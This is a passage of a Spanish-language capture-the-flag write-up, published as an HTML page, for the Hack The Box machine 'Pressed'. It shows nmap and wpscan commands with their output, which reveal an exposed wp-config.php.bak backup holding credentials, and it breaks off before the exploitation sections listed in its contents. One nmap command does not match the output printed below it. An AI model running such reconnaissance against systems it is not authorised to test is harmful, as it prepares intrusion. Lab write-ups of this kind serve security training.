@@ -1,0 +1,1309 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Pressed - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pressed-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pressed
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../epsilon/" class="md-nav__link">
+        Epsilon
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flustered/" class="md-nav__link">
+        Flustered
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Pressed
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Pressed
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wpscan-backup-config" class="md-nav__link">
+    wpscan (backup config)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotation" class="md-nav__link">
+    Explotation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postexplotation-pwnkit" class="md-nav__link">
+    PostExplotation - PWNKIT
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalado-a-root" class="md-nav__link">
+    Escalado a root:
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unbalanced/" class="md-nav__link">
+        Unbalanced
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/return/" class="md-nav__link">
+        Return
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="pressed-htb">Pressed HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>10.10.11.142</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.11.142</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un scan de los puertos abiertos:</p>
+<blockquote>
+<p><code>nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># Nmap 7.92 scan initiated Sat Aug 20 15:51:49 2022 as: nmap -sCV -p80 -oN openPorts 10.10.11.142
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Nmap scan report for 10.10.11.142
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Host is up (0.041s latency).
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PORT   STATE SERVICE VERSION
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>|_http-server-header: Apache/2.4.41 (Ubuntu)
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|_http-title: UHC Jan Finals &amp;#8211; New Month, New Boxes
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|_http-generator: WordPress 5.9
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a># Nmap done at Sat Aug 20 15:51:59 2022 -- 1 IP address (1 host up) scanned in 10.06 seconds
+</code></pre></div>
+</li>
+</ul>
+<h2 id="wpscan-backup-config">wpscan (backup config)</h2>
+<ul>
+<li>
+<p>Se encuentra un wordpress, y tras revisarlo con wpscan localiza un backup de de la configuración con credenciales.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>wpscan --url http://pressed.htb
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>_______________________________________________________________
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>     __          _______   _____
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>     \ \        / /  __ \ / ____|
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>      \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>       \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>        \  /\  /  | |     ____) | (__| (_| | | | |
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>         \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>        WordPress Security Scanner by the WPScan Team
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>                        Version 3.8.21
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>    Sponsored by Automattic - https://automattic.com/
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>_______________________________________________________________
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>[+] URL: http://pressed.htb/ [10.10.11.142]
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>[+] Started: Sat Aug 20 20:03:12 2022
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>Interesting Finding(s):
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>[+] Headers
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>| Found By: Headers (Passive Detection)
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>| Confidence: 100%
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>[+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>| Found By: Direct Access (Aggressive Detection)
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>| Confidence: 100%
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>| References:
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>|  - http://codex.wordpress.org/XML-RPC_Pingback_API
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>[+] WordPress readme found: http://pressed.htb/readme.html
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>| Found By: Direct Access (Aggressive Detection)
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>| Confidence: 100%
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>[+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>| Found By: Direct Access (Aggressive Detection)
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>| Confidence: 100%
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>[+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>| Found By: Direct Access (Aggressive Detection)
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>| Confidence: 60%
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>| References:
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>|  - https://www.iplocation.net/defend-wordpress-from-ddos
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>|  - https://github.com/wpscanteam/wpscan/issues/1299
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>| Found By: Rss Generator (Passive Detection)
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>|  - http://pressed.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>|  - http://pressed.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9&lt;/generator&gt;
+<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>
+<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>[+] WordPress theme in use: retrogeek
+<a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>| Location: http://pressed.htb/wp-content/themes/retrogeek/
+<a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>| Last Updated: 2022-04-23T00:00:00.000Z
+<a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>| Readme: http://pressed.htb/wp-content/themes/retrogeek/README.txt
+<a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>| [!] The version is out of date, the latest version is 0.6
+<a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>| Style URL: http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42
+<a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>| Style Name: RetroGeek
+<a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a>| Style URI: https://tuxlog.de/retrogeek/
+<a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a>| Description: A lightweight, minimal, fast and geeky retro theme remembering the good old terminal times...
+<a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>| Author: tuxlog
+<a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>| Author URI: https://tuxlog.de/
+<a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>|
+<a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>| Found By: Css Style In Homepage (Passive Detection)
+<a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a>|
+<a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>| Version: 0.5 (80% confidence)
+<a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>| Found By: Style (Passive Detection)
+<a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>|  - http://pressed.htb/wp-content/themes/retrogeek/style.css?ver=42, Match: &#39;Version: 0.5&#39;
+<a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>
+<a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>[+] Enumerating All Plugins (via Passive Methods)
+<a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>
+<a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>[i] No plugins Found.
+<a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>
+<a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+<a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a>Checking Config Backups - Time: 00:00:53 &lt;=============================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:53
+<a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a>
+<a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a>[i] Config Backup(s) Identified:
+<a id="__codelineno-1-82" name="__codelineno-1-82" href="#__codelineno-1-82"></a>
+<a id="__codelineno-1-83" name="__codelineno-1-83" href="#__codelineno-1-83"></a>[!] http://pressed.htb/wp-config.php.bak
+<a id="__codelineno-1-84" name="__codelineno-1-84" href="#__codelineno-1-84"></a>| Found By: Direct Access (Aggressive Detection)
+<a id="__codelineno-1-85" name="__codelineno-1-85" href="#__codelineno-1-85"></a>
+<a id="__codelineno-1-86" name="__codelineno-1-86" href="#__codelineno-1-86"></a>[!] No WPScan API Token given, as a result vulnerability data has not been output.
